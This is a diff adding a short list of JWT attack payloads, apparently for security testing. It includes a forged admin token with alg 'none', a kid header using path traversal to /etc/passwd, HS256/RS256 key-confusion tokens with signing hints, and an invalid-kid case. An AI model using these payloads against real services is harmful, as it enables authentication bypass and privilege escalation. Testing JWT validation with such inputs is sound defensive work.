@@ -1,0 +1,39 @@
+// 🔓 JWT with `alg: none` (no signature, forged admin user)
+eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+
+// 🛠 JWT with tampered KID and HS256 (file-based confusion)
+Header:
+{
+  "alg": "HS256",
+  "kid": "../../../../etc/passwd"
+}
+Payload:
+{
+  "user": "admin",
+  "role": "admin"
+}
+// Sign using empty string or dummy key for testing
+
+// 🛠 JWT with HS256 using RS256 Public Key as secret
+Header:
+{
+  "alg": "HS256",
+  "kid": "public.pem"
+}
+Payload:
+{
+  "user": "admin"
+}
+// Sign using HMAC(secret = server’s public key)
+
+// 📛 JWT with a fake/invalid KID (no key match)
+Header:
+{
+  "alg": "RS256",
+  "kid": "nonexistentkey"
+}
+Payload:
+{
+  "user": "admin"
+}
+// Will fail if backend expects this key ID to be valid
